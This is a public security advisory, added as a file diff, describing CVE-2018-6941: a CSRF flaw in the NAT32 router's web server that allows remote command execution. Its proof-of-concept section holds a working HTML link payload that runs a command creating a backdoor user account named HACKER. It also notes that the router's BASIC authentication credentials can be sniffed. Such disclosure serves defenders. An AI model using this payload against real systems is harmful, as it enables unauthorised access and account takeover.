@@ -1,0 +1,75 @@
+[+] Credits: hyp3rlinx
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/NAT32-REMOTE-COMMAND-EXECUTION-CSRF-CVE-2018-6941.txt
+[+] ISR: Apparition Security
+
+[-_-] D1rty0tis
+	
+
+Vendor:
+=============
+www.nat32.com
+
+
+Product:
+===========
+NAT32 Build (22284)
+
+NAT32® is a versatile IP Router implemented as a WIN32 application.
+
+
+Vulnerability Type:
+===================
+Remote Command Execution (CSRF)
+
+
+CVE Reference:
+==============
+CVE-2018-6941
+
+
+Security Issue:
+================
+CSRF issue exists in the HTTPD component of NAT32 v2.2 Build 22284 devices that can be exploited for Remote Code Execution.
+
+Remote attackers can potentially execute arbitrary System Commands due to a Cross Site Request Forgery, if an authenticated NAT32 user clicks a malicious link
+or visits an attacker controlled webpage as NAT32 performs no check for blind requests.
+
+Its also worth mentioning is NAT32 implements BASIC authentication which pass BASE64 Encoded credentials which can be easily revealed if sniffed on network.
+
+
+Exploit/POC:
+=============
+<a href="http://VICTIM-IP:8080/shell?cmd=exec+net%20user%20HACKER%20abc123%20/add">Backdoor clicker</a>
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: February 9, 2018
+Vendor acknowledgement: February 9, 2018
+Vendor "I've decided to remove the HTTPD code from Build 22284 of NAT32" : February 12, 2018
+www.nat32.com website reads "NAT32 Version 2.2 Build 22284 is temporarily unavailable." : February 13, 2018
+February 14, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
